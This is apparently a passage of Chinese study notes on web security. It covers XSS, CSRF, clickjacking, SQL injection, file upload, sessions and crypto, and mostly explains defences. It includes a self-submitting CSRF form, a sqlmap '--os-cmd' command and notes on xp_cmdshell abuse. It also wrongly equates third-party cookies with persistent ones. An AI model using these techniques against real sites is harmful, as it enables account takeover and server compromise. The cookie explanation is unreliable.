title="4、一些作用"></a>4、一些作用</h3><p>1、Cookie窃取，达到登录用户账户的目的</p><p>2、构造get和post请求</p><p>3、钓鱼，例如伪造登录框等</p><p>4、识别用户浏览器，用来实施一次精准的浏览器内存攻击，植入木马等</p><p>5、识别用户安装的软件，判断软件，选择对应的浏览器漏洞，最终植入木马</p><p>6、通过CSS查看用户历史浏览记录，通过浏览器会将点击过的链接示以不同的颜色来判断历史记录（只不过已经被修了</p><p>7、获取真实IP，js本身没有提供获取本地IP的能力，所以一般还要结合第三方软件，例如Java Applet的接口，还可以是Flash，iTunes，Office Word，QuickTime等</p><p>8、XSS Worm</p><h3 id="5、一些攻击平台"><a href="#5、一些攻击平台" class="headerlink" title="5、一些攻击平台"></a>5、一些攻击平台</h3><p>1、<a href="https://code.google.com/archive/p/attackapi/">Attack API</a></p><p>2、BeEF（好像无了？）</p><p>3、XSS-Proxy</p><h3 id="6、一些构造技巧"><a href="#6、一些构造技巧" class="headerlink" title="6、一些构造技巧"></a>6、一些构造技巧</h3><p>1、利用字符编码绕过转义符号，例如GBK/GB2312编码下，”%c1\“组合在一起会成为一个Unicode字符从而绕开转义符号</p><p>2、绕过长度限制的方法：1）利用Event； 2）利用location.hash； 3）利用注释符；</p><p>3、&lt;base&gt;标签，定义所有使用相对路径标签的hosting地址</p><p>4、window.name 很多时候不受同源策略的限制</p><h3 id="7、其他"><a href="#7、其他" class="headerlink" title="7、其他"></a>7、其他</h3><p>1、Apache Expect Header XSS</p><p>2、Anehta的回旋镖</p><p>3、Flash XSS</p><h3 id="8、防御XSS"><a href="#8、防御XSS" class="headerlink" title="8、防御XSS"></a>8、防御XSS</h3><p><strong>1、HttpOnly</strong>：解决XSS的Cookie劫持攻击</p><p><strong>2、输入检查</strong>：过滤或编码特殊字符，匹配XSS的特征等</p><p><strong>3、输出检查</strong>：使用安全的编码函数，OWASP ESAPI中有一个非常严格且安全的JavascriptEncode的实现可以调用</p><h3 id="9、正确地防御XSS"><a href="#9、正确地防御XSS" class="headerlink" title="9、正确地防御XSS"></a>9、正确地防御XSS</h3><p><strong>XSS的本质还是一种“HTML注入”，用户的数据被当作了HTML代码一部分来执行，从而混淆了原来的语义，产生了新的语义。</strong></p><p>对于XSS可能发生的场景一一解决</p><p><strong>1、在HTML标签中输出</strong></p><p>防御方法：对变量使用HtmlEncode</p><p><strong>2、在HTML属性中输出</strong></p><p>防御方法：对变量使用HtmlEncode或者采用OWASP ESAPI中更严格的HtmlEncode</p><p><strong>3、在&lt;script&gt;标签中输出</strong></p><p>防御方法：使用JavascriptEncode</p><p><strong>4、在事件中输出</strong></p><p>防御方法：使用JavascriptEncode</p><p><strong>5、在CSS中输出</strong></p><p>防御方法：使用OWASP ESAPI中的encodeForCSS()函数</p><p><strong>6、在地址中输出：</strong></p><p>伪协议例如javascript，vbscript，dataURL等都可能导致脚本执行</p><p>防御方法：先检查变量是否以http开头，如果不是则自动添加，然后再对变量进行URLEncode</p><h3 id="10、处理富文本"><a href="#10、处理富文本" class="headerlink" title="10、处理富文本"></a>10、处理富文本</h3><p>网站允许用户提交一些自定义的HTML代码，称之为富文本</p><p>防御手段应对标签，属性，时间进行白名单过滤，也要尽可能禁止用户自定义CSS和style，如果一定要允许用户自定义样式，则只能像过滤富文本那样过滤CSS</p><p>目前最好的XSS Filter是OWASP上的一个开源项目：Anti-Samy</p><p>在php中可以使用开源项目：HTMLPurify</p><h3 id="11、防御DOM-Based-XSS"><a href="#11、防御DOM-Based-XSS" class="headerlink" title="11、防御DOM Based XSS"></a>11、防御DOM Based XSS</h3><p> 从javascipt输出到html也相当于一次XSS输出的过程，需要分语境使用不同的编码函数</p><h2 id="第四章-CSRF"><a href="#第四章-CSRF" class="headerlink" title="第四章 CSRF"></a>第四章 CSRF</h2><h3 id="1、CSRF跨站点请求伪造"><a href="#1、CSRF跨站点请求伪造" class="headerlink" title="1、CSRF跨站点请求伪造"></a>1、CSRF跨站点请求伪造</h3><p>挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法</p><h3 id="2、进阶"><a href="#2、进阶" class="headerlink" title="2、进阶"></a>2、进阶</h3><h4 id="1、浏览器的Cookie策略"><a href="#1、浏览器的Cookie策略" class="headerlink" title="1、浏览器的Cookie策略"></a>1、浏览器的Cookie策略</h4><p>1、浏览器所持有的Cookie分为两种，一种是“Session cookie”，又称“临时Cookie“，一种是”Third-party Cookie“，又称”本地Cookie“</p><p>2、Session cookie在浏览器关闭后失效，Third-party Cookie在服务器Set-Cookie时指定的Expire时间后失效</p><p>3、若是一个网站设置了Session cookie，在浏览器进程的生命周期内，即使打开了新的tab页，也是有效的，Session cookie保存在浏览器进程的内存空间中，而Third-party Cookie保存在本地</p><p>4、如果浏览器从一个域的页面中，要加载另一个域的资源，由于安全原因，某些浏览器会阻止Third-party Cookie的发送</p><h4 id="2、P3P头的副作用"><a href="#2、P3P头的副作用" class="headerlink" title="2、P3P头的副作用"></a>2、P3P头的副作用</h4><p>P3P Header是W3C制定的一项关于隐私的标准，全称是The Platform for Privacy Preferences，如果网站返回给浏览器的HTTP头中包含P3P头，在某种程度上说，将允许浏览器发送第三方Cookie</p><h4 id="3、GET和POST"><a href="#3、GET和POST" class="headerlink" title="3、GET和POST"></a>3、GET和POST</h4><p>CSRF攻击不只能由GET请求发起，也可以是POST，例如</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>CSRF<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://192.168.1.188/mycode/csrf.php&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;test&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;user&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;pass&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript">    <span class="hljs-keyword">var</span> f=<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;test&quot;</span>);</span><br><span class="javascript">    f.getElementsByTagName(<span class="hljs-string">&quot;input&quot;</span>)[<span class="hljs-number">0</span>].value=<span class="hljs-string">&quot;user&quot;</span>;</span><br><span class="javascript">    f.getElementsByTagName(<span class="hljs-string">&quot;input&quot;</span>)[<span class="hljs-number">1</span>].value=<span class="hljs-string">&quot;pass&quot;</span>;</span><br>    f.submit();<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="4、Flash-CSRF"><a href="#4、Flash-CSRF" class="headerlink" title="4、Flash CSRF"></a>4、Flash CSRF</h4><p>Flash有很多方式发起包括POST在内的网络请求，例如URLRequest，getURL，loadVars等</p><h4 id="5、CSRF-Worm"><a href="#5、CSRF-Worm" class="headerlink" title="5、CSRF Worm"></a>5、CSRF Worm</h4><h3 id="4、防御CSRF"><a href="#4、防御CSRF" class="headerlink" title="4、防御CSRF"></a>4、防御CSRF</h3><h4 id="1、验证码"><a href="#1、验证码" class="headerlink" title="1、验证码"></a>1、验证码</h4><p>最简洁而有效，但不能作为最主要的解决方案</p><h4 id="2、Referer-Check"><a href="#2、Referer-Check" class="headerlink" title="2、Referer Check"></a>2、Referer Check</h4><p>用于检测请求是否来自合法的源，缺陷在于服务器并非什么时候都能收到Referer，很多时候处于隐私保护的考虑，还有在某些情况下例如HTTPS跳转到HTTP，浏览器都不会发送Referer</p><h3 id="5、CSRF的本质"><a href="#5、CSRF的本质" class="headerlink" title="5、CSRF的本质"></a>5、CSRF的本质</h3><p>现在对于CSRF的防御，一致的做法是使用一个token</p><h4 id="1、本质"><a href="#1、本质" class="headerlink" title="1、本质"></a>1、本质</h4><p><strong>CSRF能够攻击成功的本质原因是重要操作的所有参数都是可以被攻击者猜到的</strong></p><p>攻击者只有猜测出URL的所有参数和参数值，才能成功的构造一个伪造的请求，因此可以想到这样一个解决方案：把参数加密，或者使用一些伪随机数，但是这个方法也有问题，<strong>首先</strong>是URL变得非常难读，对用户不友好，<strong>其次是</strong>如果加密的参数每次都改变，某些URL将无法被用户收藏，<strong>最后</strong>普通参数如果也被加密或者哈希，将会给数据分析工作带来很大的困扰。</p><p>因此使用一个更加通用的方法来解决这个问题，就是使用<strong>Anti CSRF Token</strong></p><h4 id="2、Token的使用方法"><a href="#2、Token的使用方法" class="headerlink" title="2、Token的使用方法"></a>2、Token的使用方法</h4><p>原URL不变，新增一个参数Token，这个Token的值是足够随机的，必须使用足够安全的随机数生成算法，或采用真随机数生成器，为用户和服务器共同持有，不能被第三者知晓，实际应用中，Token可以放在用户的Session中，或者浏览器的Cookie中。</p><p>Token需要同时放在表单和Session中，在提交请求时，服务器只需验证表单中的Token，和用户Session（或Cookie）中的Token是否一致，一致则合法，不一致则可能发生CSRF攻击</p><h4 id="3、Token的使用原则"><a href="#3、Token的使用原则" class="headerlink" title="3、Token的使用原则"></a>3、Token的使用原则</h4><p>1、足够随机</p><p>2、为了使用方便，可以允许在一个用户的有效生命周期内，在Token被消耗掉前都使用同一个Token，但是如果用户已经提交了表单，则这个Token已经消耗掉，应该重新生成一个新的Token</p><p>3、一个页面消耗掉Token后，其他页面可能还保存着之前的Token，因此可以考虑生成多个Token来解决多页面共存的情况</p><p>4、注意保密性。尽可能把Token放在表单中，把敏感操作由GET改为POST，以form或AJAX的形式提交，可以避免Token泄露</p><p>5、CSRF的Token仅用于对抗CSRF的攻击，网站还存在XSS时，这个方案就无效了，因为XSS可以模拟客户端浏览器执行任意操作，攻击者完全可以请求页面后，读出页面内容里的Token值，然后构造出一个合法的请求，这个过程可以称之为XSRF。</p><h2 id="第五章-点击劫持"><a href="#第五章-点击劫持" class="headerlink" title="第五章 点击劫持"></a>第五章 点击劫持</h2><h3 id="1、ClickJacking-点击劫持"><a href="#1、ClickJacking-点击劫持" class="headerlink" title="1、ClickJacking 点击劫持"></a>1、ClickJacking 点击劫持</h3><p>攻击者使用一个透明的，不可见的iframe，覆盖在一个页面上，然后诱使用户在该网页上进行操作，此使用户将在不知情的情况下点击透明的iframe页面，通过调整iframe的位置，可以诱使用户恰好点击在iframe页面的一些功能性按钮上。</p><h3 id="2、Flash点击劫持"><a href="#2、Flash点击劫持" class="headerlink" title="2、Flash点击劫持"></a>2、Flash点击劫持</h3><p>通过Flash构造点击劫持，弯沉一系列复杂的动作后，最终控制用户电脑的摄像头（已修复）</p><h3 id="3、图片覆盖攻击"><a href="#3、图片覆盖攻击" class="headerlink" title="3、图片覆盖攻击"></a>3、图片覆盖攻击</h3><h3 id="4、拖拽劫持与数据窃取"><a href="#4、拖拽劫持与数据窃取" class="headerlink" title="4、拖拽劫持与数据窃取"></a>4、拖拽劫持与数据窃取</h3><p>主流的浏览器都有drag-and-drop API 接口，拖拽劫持的思路就是诱使用户从隐藏的不可见的iframe中拖拽出攻击者希望得到的数据，然后放到攻击者能控制的另一个页面中，从而窃取数据。（突破同源策略）</p><h3 id="5、TapJacking-触屏劫持"><a href="#5、TapJacking-触屏劫持" class="headerlink" title="5、TapJacking 触屏劫持"></a>5、TapJacking 触屏劫持</h3><h3 id="6、防御ClickJacking"><a href="#6、防御ClickJacking" class="headerlink" title="6、防御ClickJacking"></a>6、防御ClickJacking</h3><h4 id="1、frame-busting"><a href="#1、frame-busting" class="headerlink" title="1、frame busting"></a>1、frame busting</h4><p>一段用于禁止iframe嵌套的js代码，但是很容易绕开</p><h4 id="2、X-Frame-Options"><a href="#2、X-Frame-Options" class="headerlink" title="2、X-Frame-Options"></a>2、X-Frame-Options</h4><p>一个HTTP头，当值为DENY时，浏览器会拒绝当前页面加载任何frame页面，若值为SAMEORIGIN，则frame页面的地址只能为同源域名下的页面，若值为ALLOW-FROM，则可以定义允许frame加载的页面地址</p><h2 id="第六章-HTML5安全"><a href="#第六章-HTML5安全" class="headerlink" title="第六章 HTML5安全"></a>第六章 HTML5安全</h2><h3 id="1、HTML5新标签"><a href="#1、HTML5新标签" class="headerlink" title="1、HTML5新标签"></a>1、HTML5新标签</h3><p><strong>1、新标签的XSS</strong>：HTML5新的标签可能引发新的XSS</p><p><strong>2、iframe的sandbox</strong>：使用sandbox这一个属性后，iframe标签加载的内容被视为一个独立的“源”，其中的脚本将被禁止执行，表单被禁止提交，插件被禁止加载，指向其他浏览对象的链接也会禁止，还可以通过参数来支持更精确的控制，极大增强了应用使用iframe的安全性</p><p><strong>3、Link Types</strong>：noreferr 指定noreferer后浏览器在请求该标签指定的地址时将不再发送Referer</p><p><strong>4、Canvas</strong>：可以用来在页面中直接操作图片对象，也可以直接操作像素，构造出图片区域，例如用来破解验证码</p><h3 id="2、其他安全问题"><a href="#2、其他安全问题" class="headerlink" title="2、其他安全问题"></a>2、其他安全问题</h3><p><strong>1、Cross-Origin Resource Sharing</strong>：Origin Header用于标记HTTP标记的“源”，服务器端通过识别浏览器自动带上的Origin Header，来判断浏览器的请求是否来自一个合法的“源”，用于防范CSRF，不像Referer那么容易被伪造或清空。</p><p><strong>2、postMessage-跨窗口传递消息</strong>：允许每一个window（包括当前窗口，弹出窗口，iframes等）对象往其他的窗口发送文本消息，从而实现跨窗口的消息传递，并不受同源策略的影响。有两个安全问题需要注意：1）必要时，可以在接受窗口验证Domain，甚至验证URL，以防止来自非法页面的消息；2）如果将消息写入innerHTML，甚至直接写入script中，则可能会导致DOM based XSS的产生。利用postMessage()给父窗口发送消息，可以突破将js代码限制在其中的iframe sandbox。</p><p><strong>3、Web Storage</strong>：分为Session Storage，Local Storage，前者关闭浏览器就会消失，后者会一直存在。Web Storage就像一个非关系型数据库，由key-value对组成，可以用js代码对其进行操作。Firefox单独实现了一个globalStorage，基于SQLite实现。受同源策略的约束，每个域的信息只会保存在自己的域下。攻击者可能将恶意代码保存在Web Storage中，从而实现跨页面攻击。</p><h2 id="第七章-注入攻击"><a href="#第七章-注入攻击" class="headerlink" title="第七章 注入攻击"></a>第七章 注入攻击</h2><h3 id="1、注入攻击的本质"><a href="#1、注入攻击的本质" class="headerlink" title="1、注入攻击的本质"></a>1、注入攻击的本质</h3><p>注入攻击的本质是<strong>把用户输入的数据当作代码执行</strong>，其中有<strong>两个关键点，一是用户能够控制输入，二是原本程序要执行的代码，拼接了用户输入的数据</strong></p><h3 id="2、SQL注入"><a href="#2、SQL注入" class="headerlink" title="2、SQL注入"></a>2、SQL注入</h3><h4 id="1、命令执行"><a href="#1、命令执行" class="headerlink" title="1、命令执行"></a>1、命令执行</h4><p>在MySQL4中，可以通过UDF执行系统命令，尤其是当运行mysql进程的用户是root时，将直接获得root权限。Mysql5及之后的版本就无了，但是还有其他的方法——通过lib_mysqludf_sys提供的几个函数执行系统命令，其中最主要的时sys_eval()和sys_exec()。攻击过程中，将lib_mysqludf_sys.so上传到数据库能访问到的路径下，创建UDF之后，就可以使用sys_eval()等函数执行系统命令了。</p><p>sqlmap集成了此功能 </p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">python sqlmap.py -u <span class="hljs-string">&quot;url&quot;</span> --os-<span class="hljs-keyword">cmd</span><span class="bash"> -id -v 1</span><br></code></pre></td></tr></table></figure><p>在MS SQL Server中，可以直接使用存储过程“xp_cmdshell”执行系统命令</p><p>在Oracal数据库中，如果服务器环境同时还有Java环境，可以在Oracal中创建Java的存储过程执行系统命令。</p><h4 id="2、攻击存储过程"><a href="#2、攻击存储过程" class="headerlink" title="2、攻击存储过程"></a>2、攻击存储过程</h4><p>臭名昭著的存储过程“xp_cmdshell”，在SQL Server 2000中默认开启，如果被关闭了可以用sp_addextendedproc开启，在SQL Server 2005及以后的版本中默认关闭，如果有sysadmin的权限，可以用sp_configue开启。</p><p>存储过程本身也可能会存在注入漏洞</p><h4 id="3、编码问题"><a href="#3、编码问题" class="headerlink" title="3、编码问题"></a>3、编码问题</h4><p>经典GBK下宽字节注入绕开转义字符，建议全部统一UTF-8</p><h4 id="4、SQL-Column-Truncation"><a href="#4、SQL-Column-Truncation" class="headerlink" title="4、SQL Column Truncation"></a>4、SQL Column Truncation</h4><p>当MySQL的sql-mode设置为default时，即没有开启STRICT_ALL_TABLES时，MySQL对于用户插入的超长值只会提示warning，而不是error，并且会插入成功</p><h3 id="3、正确地防御SQL注入"><a href="#3、正确地防御SQL注入" class="headerlink" title="3、正确地防御SQL注入"></a>3、正确地防御SQL注入</h3><h4 id="1、使用预编译语句"><a href="#1、使用预编译语句" class="headerlink" title="1、使用预编译语句"></a>1、使用预编译语句</h4><p>防御SQL注入的最佳方式，就是使用预编译语句，绑定变量。使用预编译的SQL语句，SQL语句的语义不会发生改变。在SQL语句中，变量用？表示，攻击者无法改变SQL结构。</p><h4 id="2、使用存储过程"><a href="#2、使用存储过程" class="headerlink" title="2、使用存储过程"></a>2、使用存储过程</h4><p>使用安全的存储过程对抗SQL注入，和预编译语句类似，区别在于存储过程需要先将SQL语句定义在数据库中。存储过程主要应该尽量避免在存储过程内使用动态的SQL语句，无法避免的话应该使用严格的输入过滤或编码函数来处理用户的输入数据。</p><p>有的时候无法使用预编译语句和存储过程，只能回到输入过滤和编码等方法上来。</p><h4 id="3、检查数据类型"><a href="#3、检查数据类型" class="headerlink" title="3、检查数据类型"></a>3、检查数据类型</h4><p>可以很大程度上对抗SQL注入，但如果是需要用户提交字符串，就需要其他方法了</p><h4 id="4、使用安全函数"><a href="#4、使用安全函数" class="headerlink" title="4、使用安全函数"></a>4、使用安全函数</h4><p>使用足够安全的编码函数，可以参考OWASP ESAPI中的实现</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ESAPI</span>.</span></span>encoder<span class="hljs-literal">()</span>.encode<span class="hljs-constructor">ForSQL( <span class="hljs-params">new</span> OracleCodec()</span> , queryparam )<br></code></pre></td></tr></table></figure><p>在使用的时候：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">Codec ORACLE_CODEC = <span class="hljs-keyword">new</span> <span class="hljs-constructor">OracleCodec()</span>;<br>String query = <span class="hljs-string">&quot;SELECT user_id FROM user_data WHERE user_name = &#x27;&quot;</span> + <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ESAPI</span>.</span></span>encoder<span class="hljs-literal">()</span>.encode<span class="hljs-constructor">ForSQL( ORACLE_CODEC , <span class="hljs-params">req</span>.<span class="hljs-params">getParameter</span>(<span class="hljs-string">&quot;userID&quot;</span>)</span>) + <span class="hljs-string">&quot;&#x27; and user_password = &#x27;&quot;</span> + <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ESAPI</span>.</span></span>encoder<span class="hljs-literal">()</span>.encode<span class="hljs-constructor">ForSQL( ORACLE_CODEC , <span class="hljs-params">req</span>.<span class="hljs-params">getParameter</span>(<span class="hljs-string">&quot;pwd&quot;</span>)</span>) + <span class="hljs-string">&quot;&#x27;&quot;</span>;<br></code></pre></td></tr></table></figure><h3 id="4、其他注入"><a href="#4、其他注入" class="headerlink" title="4、其他注入"></a>4、其他注入</h3><h4 id="1、XML注入"><a href="#1、XML注入" class="headerlink" title="1、XML注入"></a>1、XML注入</h4><p>XML和HTML一样都是SGML（标准通用标记语言），也存在注入攻击，修补方案上对用户输入数据中包含的“语言本身的保留字符”进行转移即可</p><h4 id="2、代码注入"><a href="#2、代码注入" class="headerlink" title="2、代码注入"></a>2、代码注入</h4><p>代码注入和命令注入往往都是由一些不安全的函数或者方法引起的，存在漏洞的地方跟“后门”没有区别</p><p>JSP和PHP的动态include（文件包含漏洞）导致的代码执行，也可以算是一种代码注入</p><p>尽量避免使用危险函数，一定要使用就需要对用户的输入数据进行处理</p><h4 id="3、CRLF注入"><a href="#3、CRLF注入" class="headerlink" title="3、CRLF注入"></a>3、CRLF注入</h4><p>CRLF实际上是\r和\n两个用于换行的字符，通过“注入CRLF字符”就有可能改变原来的语义，防御方法也很简单，就是处理好这两个字符</p><h2 id="第八章-文件上传漏洞"><a href="#第八章-文件上传漏洞" class="headerlink" title="第八章 文件上传漏洞"></a>第八章 文件上传漏洞</h2><h3 id="1、条件"><a href="#1、条件" class="headerlink" title="1、条件"></a>1、条件</h3><p>首先，上传的文件能够被web容器解释执行</p><p>其次，用户能够从web上访问这个文件</p><p>最后，用户上传的文件没有被安全检查，格式化，图片压缩等功能改变</p><h3 id="2、绕过文件上传检查功能"><a href="#2、绕过文件上传检查功能" class="headerlink" title="2、绕过文件上传检查功能"></a>2、绕过文件上传检查功能</h3><h3 id="3、功能还是漏洞"><a href="#3、功能还是漏洞" class="headerlink" title="3、功能还是漏洞"></a>3、功能还是漏洞</h3><p>1、Apache文件解析问题</p><p>2、IIS文件解析问题</p><p>3、PHP CGI路径解析问题</p><p>4、利用上传文件钓鱼</p><h3 id="4、设计安全的文件上传功能"><a href="#4、设计安全的文件上传功能" class="headerlink" title="4、设计安全的文件上传功能"></a>4、设计安全的文件上传功能</h3><p>1、文件上传目录设置为不可执行</p><p>2、判断文件类型</p><p>3、使用随机数改写文件名和文件路径</p><p>4、单独设置文件服务器的域名</p><h2 id="第九章-认证与会话管理"><a href="#第九章-认证与会话管理" class="headerlink" title="第九章 认证与会话管理"></a>第九章 认证与会话管理</h2><h3 id="1、认证和授权"><a href="#1、认证和授权" class="headerlink" title="1、认证和授权"></a>1、认证和授权</h3><p>认证的目的是为了认出用户是谁，而授权的目的是为了决定用户能够做什么</p><p>认证实际上就是一个验证凭证的过程</p><h3 id="2、密码"><a href="#2、密码" class="headerlink" title="2、密码"></a>2、密码</h3><p>密码必须以不可逆的加密算法，或者是单向散列函数，加密后存储在数据库中</p><h3 id="3、Session与认证"><a href="#3、Session与认证" class="headerlink" title="3、Session与认证"></a>3、Session与认证</h3><p>最常见的做法是把用户持有的SessionID加密后保存在Cookie中，SessionID在生命周期内被窃取，就等同于账户失窃，如果SessionID在Cookie里面，也可以称为Cookie劫持，当然也可以存在URL里面，但是不安全</p><p>Cookie泄露的途径有很多，最常见的是XSS，网络Sniff，以及本地木马窃取</p><h3 id="4、Session-Fixation攻击"><a href="#4、Session-Fixation攻击" class="headerlink" title="4、Session Fixation攻击"></a>4、Session Fixation攻击</h3><p>攻击过程：攻击者先获取到一个未认证的SessionID，然后将这个SessionID交给受害者去认证，受害者认证后，服务器并未更新此SessionID的值，所以攻击者可以直接凭借此SessionID登陆进受害者的账户</p><p>如果SessionID存在Cookie中，比较难做到这个过程，但如果是URL，攻击者只需要诱使受害者打开这个URL即可</p><p>解决Session Fixation的正确做法是，在登陆完成后，重写SessionID</p><h3 id="5、Session保持攻击"><a href="#5、Session保持攻击" class="headerlink" title="5、Session保持攻击"></a>5、Session保持攻击</h3><p>攻击者可以通过不停地发起访问请求，让Session一直活下去</p><p>常见的对抗做法是在一定时间后强制销毁Session，还可以选择的方法是当用户客户端发生变化时，要求用户重新登录，比如IP，UserAgent等</p><h3 id="6、单点登录（SSO）"><a href="#6、单点登录（SSO）" class="headerlink" title="6、单点登录（SSO）"></a>6、单点登录（SSO）</h3><p>SSO希望用户登录一次就可以访问所有系统。其优缺点都是风险集中化</p><h2 id="第十章-访问控制"><a href="#第十章-访问控制" class="headerlink" title="第十章 访问控制"></a>第十章 访问控制</h2><h3 id="1、概念"><a href="#1、概念" class="headerlink" title="1、概念"></a>1、概念</h3><p>某个实体对某个客体需要实施某种操作，而系统对这种操作的限制就是权限控制</p><p>在Web应用中，根据访问客体不同，常见的访问控制可以分为“基于URL的访问控制”，“基于方法的访问控制”和“基于数据的访问控制”</p><h3 id="2、垂直权限控制"><a href="#2、垂直权限控制" class="headerlink" title="2、垂直权限控制"></a>2、垂直权限控制</h3><p>用户→角色→权限</p><p>这种基于角色的权限管理（RBAC模型），称之为“垂直权限管理”</p><h3 id="3、水平权限管理"><a href="#3、水平权限管理" class="headerlink" title="3、水平权限管理"></a>3、水平权限管理</h3><p>用户A与用户B可能属于同一个角色RoleX，但是用户A与用户B都各自拥有一些私有数据，在正常情况下，应该只有用户自己才能访问自己的私有数据。</p><p>但是在上面的RBAC模型下，系统只会验证用户A是否属于角色RoleX，而不会判断用户A是否能访问只属于用户B的数据dataB,因此，发生了越权访问。这种问题，我们称之为“水平权限管理问题”。 </p><h3 id="4、OAuth"><a href="#4、OAuth" class="headerlink" title="4、OAuth"></a>4、OAuth</h3><h2 id="第十一章-加密算法与随机数"><a href="#第十一章-加密算法与随机数" class="headerlink" title="第十一章 加密算法与随机数"></a>第十一章 加密算法与随机数</h2><h3 id="1、Stream-Cipher-Attack"><a href="#1、Stream-Cipher-Attack" class="headerlink" title="1、Stream Cipher Attack"></a>1、Stream Cipher Attack</h3><p>1、Reused Key Attack</p><p>2、Bit-flipping Attack</p><p>3、弱随机IV问题</p><h3 id="2、WEP破解"><a href="#2、WEP破解" class="headerlink" title="2、WEP破解"></a>2、WEP破解</h3><h3 id="3、ECB模式的缺陷"><a href="#3、ECB模式的缺陷" class="headerlink" title="3、ECB模式的缺陷"></a>3、ECB模式的缺陷</h3><p>改变分组密文的顺序，将改变解密后的明文顺序，替换也是如此，当需要加密的明文多于一个分组的长度时，应该避免使用ECB模式</p><h3 id="4、Padding-Oracle-Attack"><a href="#4、Padding-Oracle-Attack" class="headerlink" title="4、Padding Oracle Attack"></a>4、Padding Oracle Attack</h3><h3 id="5、密钥管理"><a href="#5、密钥管理" class="headerlink" title="5、密钥管理"></a>5、密钥管理</h3><p>将密钥保存在配置文件或者数据库中</p><h3 id="6、伪随机数问题"><a href="#6、伪随机数问题" class="headerlink" title="6、伪随机数问题"></a>6、伪随机数问题</h3><p>1、弱伪随机数</p><p>2、时间不随机</p><p>3、破解种子：种子确定后，随机数的值和顺序都是固定的</p><h3 id="7、建议"><a href="#7、建议" class="headerlink" title="7、建议"></a>7、建议</h3><p>1、不要使用ECB模式</p><p>2、不要使用流密码（比如RC4）</p><p>3、使用HMAC-SHA1代替MD5（甚至是代替SHA1）</p><p>4、不要使用相同的key做不同的事情</p><p>5、salts和IV需要随机生成</p><p>6、不要自己实现加密算法</p><p>7、不要依赖系统的保密性</p><p>1、使用CBC模式的AES256用于加密</p><p>2、使用HMAC-SHA512用于完整性检查</p><p>3、使用带salt的SHA-256或SHA-512用于Hashing</p><h2 id="第十二章-Web框架安全"><a href="#第十二章-Web框架安全" class="headerlink" title="第十二章 Web框架安全"></a>第十二章 Web框架安全</h2><h3 id="1、MVC框架安全"><a href="#1、MVC框架安全" class="headerlink" title="1、MVC框架安全"></a>1、MVC框架安全</h3><p>在现代Web开发中，使用MVC架构是一种流行的做法。MVC是Model-View-Controller的缩写，它将Web应用分为三层，View成负责用户视图、页面展示等工作；Controller负责应用的逻辑实现，接受View层传入的用户请求，并转发给对应的Model做处理；Model层则负责实现模型，完成数据的处理。</p><p>SQL注入是Model层的问题</p><h3 id="2、模板引擎与XSS防御"><a href="#2、模板引擎与XSS防御" class="headerlink" title="2、模板引擎与XSS防御"></a>2、模板引擎与XSS防御</h3><p>XSS是View层的问题，因此使用“输出编码”的防御方法更合理</p><p>Django Templates支持的auto-escape，所有的变量都会经过HtmlEncode</p><p>Velocity可以通过Event Handler来进行HtmlEncode</p><p>但这两者都未细分编码使用的具体场景，通过自定义编码函数可以完善XSS防御</p><h3 id="3、Web框架与CSRF防御"><a href="#3、Web框架与CSRF防御" class="headerlink" title="3、Web框架与CSRF防御"></a>3、Web框架与CSRF防御</h3><p>对于Web框架来说，可以自动地在所有涉及POST的代码中添加token，这些地方包括所有的form表单，所有的Ajax 